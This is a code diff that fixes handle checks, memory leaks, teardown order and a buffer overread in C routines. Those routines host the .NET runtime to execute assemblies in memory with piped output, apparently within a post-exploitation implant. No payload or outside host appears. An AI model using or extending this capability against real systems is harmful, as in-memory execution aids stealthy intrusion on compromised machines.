@@ -22,6 +22,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     SAFEARRAYBOUND RgsBound[ 1 ]  = { 0 };
     BUFFER         AssemblyData   = { 0 };
     LPWSTR*        ArgumentsArray = NULL;
+    LPWSTR*        ArgumentsArrayBase = NULL;
     INT            ArgumentsCount = 0;
     LONG           idx[ 1 ]       = { 0 };
     VARIANT        Object         = { 0 };
@@ -44,19 +45,22 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         NULL
     );
 
-    if ( ! Instance->Dotnet->Pipe )
+    if ( ( ! Instance->Dotnet->Pipe ) || ( Instance->Dotnet->Pipe == INVALID_HANDLE_VALUE ) )
     {
         PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
         PACKAGE_ERROR_WIN32;
 
+        Instance->Dotnet->Pipe = NULL;
         return FALSE;
     }
 
-    if ( ! ( Instance->Dotnet->File = Instance->Win32.CreateFileW( Instance->Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
+    Instance->Dotnet->File = Instance->Win32.CreateFileW( Instance->Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
+    if ( ( ! Instance->Dotnet->File ) || ( Instance->Dotnet->File == INVALID_HANDLE_VALUE ) )
     {
         PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
         PACKAGE_ERROR_WIN32;
 
+        Instance->Dotnet->File = NULL;
         return FALSE;
     }
 
@@ -183,19 +187,69 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     }
 
     Instance->Dotnet->MethodArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()
+    if ( ! Instance->Dotnet->MethodArgs )
+    {
+        PUTS( "SafeArrayCreateVector failed" )
+        PACKAGE_ERROR_WIN32;
 
-    ArgumentsArray = Instance->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
-    ArgumentsArray++;
-    ArgumentsCount--;
+        return FALSE;
+    }
+
+    ArgumentsArray = NULL;
+    ArgumentsCount = 0;
+
+    /* an empty/NULL argument buffer makes CommandLineToArgvW return NULL:
+     * don't deref/advance it, run the assembly with no arguments instead */
+    if ( Arguments.Buffer && Arguments.Length )
+    {
+        ArgumentsArray = Instance->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
+        if ( ! ArgumentsArray || ArgumentsCount <= 0 )
+        {
+            ArgumentsArray = NULL;
+            ArgumentsCount = 0;
+        }
+        else
+        {
+            /* argv[0] is the assembly path: skip it, but keep the base
+             * pointer so the CommandLineToArgvW allocation stays freeable */
+            ArgumentsArrayBase = ArgumentsArray;
+            ArgumentsArray++;
+            ArgumentsCount--;
+        }
+    }
 
     Instance->Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
     Instance->Dotnet->vtPsa.parray = Instance->Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );
+    if ( ! Instance->Dotnet->vtPsa.parray )
+    {
+        PUTS( "SafeArrayCreateVector failed" )
+        PACKAGE_ERROR_WIN32;
+
+        if ( ArgumentsArrayBase )
+        {
+            Instance->Win32.LocalFree( ArgumentsArrayBase );
+            ArgumentsArrayBase = NULL;
+        }
+
+        return FALSE;
+    }
 
     for ( LONG i = 0; i < ArgumentsCount; i++ ) {
         if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->vtPsa.parray, &i, Instance->Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
             PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
+            Instance->Win32.LocalFree( ArgumentsArrayBase );
+            ArgumentsArrayBase = NULL;
             return FALSE;
         }
+    }
+
+    /* argv strings were copied into the safe array: release the
+     * CommandLineToArgvW allocation (ArgumentsArray was advanced past
+     * argv[0], so the saved base pointer is the one to free) */
+    if ( ArgumentsArrayBase )
+    {
+        Instance->Win32.LocalFree( ArgumentsArrayBase );
+        ArgumentsArrayBase = NULL;
     }
 
     if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->MethodArgs, idx, &Instance->Dotnet->vtPsa ) ) ) {
@@ -452,21 +506,37 @@ VOID DotnetClose()
         Instance->Dotnet->Assembly = NULL;
     }
 
+    if ( Instance->Dotnet->SafeArray )
+    {
+        Instance->Win32.SafeArrayDestroy( Instance->Dotnet->SafeArray );
+        Instance->Dotnet->SafeArray = NULL;
+    }
+
     if ( Instance->Dotnet->AppDomain )
     {
         Instance->Dotnet->AppDomain->lpVtbl->Release( Instance->Dotnet->AppDomain );
         Instance->Dotnet->AppDomain = NULL;
     }
 
+    /* NOTE: unload the domain while the thunk and the runtime host are still
+     * alive, then release the thunk and finally the runtime host itself */
+    if ( Instance->Dotnet->ICorRuntimeHost )
+    {
+        if ( Instance->Dotnet->AppDomainThunk != NULL ) {
+            Instance->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainThunk );
+        }
+        Instance->Dotnet->ICorRuntimeHost->lpVtbl->Stop( Instance->Dotnet->ICorRuntimeHost );
+    }
+
     if ( Instance->Dotnet->AppDomainThunk != NULL )
     {
         Instance->Dotnet->AppDomainThunk->lpVtbl->Release( Instance->Dotnet->AppDomainThunk );
+        Instance->Dotnet->AppDomainThunk = NULL;
     }
 
     if ( Instance->Dotnet->ICorRuntimeHost )
     {
-        Instance->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainThunk );
-        Instance->Dotnet->ICorRuntimeHost->lpVtbl->Stop( Instance->Dotnet->ICorRuntimeHost );
+        Instance->Dotnet->ICorRuntimeHost->lpVtbl->Release( Instance->Dotnet->ICorRuntimeHost );
         Instance->Dotnet->ICorRuntimeHost = NULL;
     }
 
@@ -504,7 +574,9 @@ BOOL FindVersion( PVOID Assembly, DWORD length )
     assembly_c = (char*)Assembly;
     char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
 
-    for (int i = 0; i < length; i++)
+    // stop 10 bytes before the end: the inner loop reads i+j and would
+    // otherwise run past the buffer on the last candidates
+    for (int i = 0; i + 10 <= ( int ) length; i++)
     {
         for (int j = 0; j < 10; j++)
         {
